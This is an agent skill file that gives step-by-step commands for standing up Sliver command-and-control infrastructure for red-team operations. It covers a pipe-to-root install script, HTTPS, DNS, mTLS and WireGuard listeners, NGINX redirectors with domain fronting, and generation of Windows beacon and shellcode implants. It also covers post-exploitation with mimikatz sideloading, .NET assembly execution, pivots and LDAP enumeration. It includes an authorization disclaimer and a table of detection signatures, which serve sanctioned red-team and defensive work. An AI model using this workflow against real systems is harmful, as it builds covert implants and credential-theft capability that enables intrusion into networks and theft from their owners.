---
name: building-c2-infrastructure-with-sliver-framework
description: Deploy and harden a Sliver C2 team server (BishopFox's Go-based adversary emulation framework) with multi-protocol listeners (mTLS, HTTP/S, DNS, WireGuard), redirectors, domain fronting, and multi-operator support for authorized red-team operations.
subdomain: red-teaming
facing: config
mitre_attack:
- T1071.001
- T1071.004
- T1573.002
- T1090.002
- T1105
- T1572
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
upstream: building-c2-infrastructure-with-sliver-framework@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.

## Prerequisites

- Familiarity with red teaming concepts and tools
- Access to test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## MITRE ATT&CK Mapping

- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1071.004** - Application Layer Protocol: DNS
- **T1573.002** - Encrypted Channel: Asymmetric Cryptography
- **T1090.002** - Proxy: External Proxy (Redirectors)
- **T1105** - Ingress Tool Transfer
- **T1132.001** - Data Encoding: Standard Encoding
- **T1572** - Protocol Tunneling

## Workflow

### Phase 1: Team Server Deployment

1. Provision VPS (e.g., DigitalOcean, Linode, AWS EC2) for team server
2. Harden OS: disable SSH password auth, configure UFW/iptables, install fail2ban
3. Install Sliver using official install script:
   ```bash
   curl https://sliver.sh/install | sudo bash
   ```
4. Start Sliver server daemon:
   ```bash
   systemctl start sliver
   # Or run interactively
   sliver-server
   ```
5. Generate operator configuration files for team members:
   ```bash
   new-operator --name operator1 --lhost <team-server-ip>
   ```

### Phase 2: Listener Configuration

1. Configure HTTPS listener with legitimate SSL certificate:
   ```bash
   https --lhost 0.0.0.0 --lport 443 --domain c2.example.com --cert /path/to/cert.pem --key /path/to/key.pem
   ```
2. Configure DNS listener for fallback C2:
   ```bash
   dns --domains c2dns.example.com --lport 53
   ```
3. Configure mTLS listener for high-security sessions:
   ```bash
   mtls --lhost 0.0.0.0 --lport 8888
   ```
4. Configure WireGuard listener for tunneled access:
   ```bash
   wg --lport 51820
   ```

### Phase 3: Redirector Setup

1. Deploy separate VPS as redirector (positioned between targets and team server)
2. Install and configure NGINX as reverse proxy:
   ```nginx
   server {
       listen 443 ssl;
       server_name c2.example.com;
       ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;

       location / {
           proxy_pass https://<team-server-ip>:443;
           proxy_ssl_verify off;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
       }
   }
   ```
3. Configure iptables rules on team server to only accept connections from redirector:
   ```bash
   iptables -A INPUT -p tcp --dport 443 -s <redirector-ip> -j ACCEPT
   iptables -A INPUT -p tcp --dport 443 -j DROP
   ```
4. Optionally set up Cloudflare as CDN layer in front of redirector for domain fronting

### Phase 4: Implant Generation

1. Generate HTTPS beacon implant:
   ```bash
   generate beacon --http https://c2.example.com --os windows --arch amd64 --format exe --name payload
   ```
2. Generate DNS beacon for restricted networks:
   ```bash
   generate beacon --dns c2dns.example.com --os windows --arch amd64
   ```
3. Generate shellcode payload for injection:
   ```bash
   generate --http https://c2.example.com --os windows --arch amd64 --format shellcode
   ```
4. Configure beacon jitter and callback intervals:
   ```bash
   generate beacon --http https://c2.example.com --seconds 60 --jitter 30
   ```

### Phase 5: Post-Exploitation Operations

1. Interact with active beacons/sessions:
   ```bash
   beacons        # List active beacons
   use <beacon-id> # Interact with a beacon
   ```
2. Execute post-exploitation modules:
   ```bash
   ps              # Process listing
   netstat         # Network connections
   execute-assembly /path/to/Seatbelt.exe -group=all  # Run .NET assemblies
   sideload /path/to/mimikatz.dll  # Load DLLs
   ```
3. Set up pivots for internal network access:
   ```bash
   pivots tcp --bind 0.0.0.0:9898  # Create pivot listener on compromised host
   ```
4. Use BOF (Beacon Object Files) for in-memory execution:
   ```bash
   armory install sa-ldapsearch  # Install from armory
   sa-ldapsearch -- "(objectClass=user)"  # Execute BOF
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| Sliver Server | C2 team server and implant management | Linux/macOS/Windows |
| Sliver Client | Operator console for team members | Cross-platform |
| NGINX | Redirector and reverse proxy | Linux |
| Certbot | Let's Encrypt SSL certificate generation | Linux |
| Cloudflare | CDN and domain fronting | Cloud |
| Armory | Sliver extension/BOF package manager | Built-in |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| Default Sliver HTTP headers | Network traffic analysis for unusual User-Agent strings |
| mTLS on non-standard ports | Firewall logs for outbound connections to unusual ports |
| DNS TXT record queries with high entropy | DNS log analysis for encoded C2 traffic |
| WireGuard UDP traffic on port 51820 | Network flow analysis for WireGuard handshake patterns |
| Sliver implant file hashes | EDR/AV signature matching against known Sliver samples |

## Validation Criteria

- [ ] Team server deployed and hardened with firewall rules
- [ ] HTTPS listener configured with valid SSL certificate
- [ ] DNS listener configured as fallback C2 channel
- [ ] At least one redirector deployed between targets and team server
- [ ] Multi-operator access configured with unique certificates
- [ ] Implants generated for target operating systems
- [ ] Beacon callback intervals and jitter configured for stealth
- [ ] Post-exploitation modules tested (process listing, .NET assembly execution)
- [ ] Pivot functionality validated for internal network access
- [ ] All C2 traffic encrypted and passing through redirectors

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/building-c2-infrastructure-with-sliver-framework
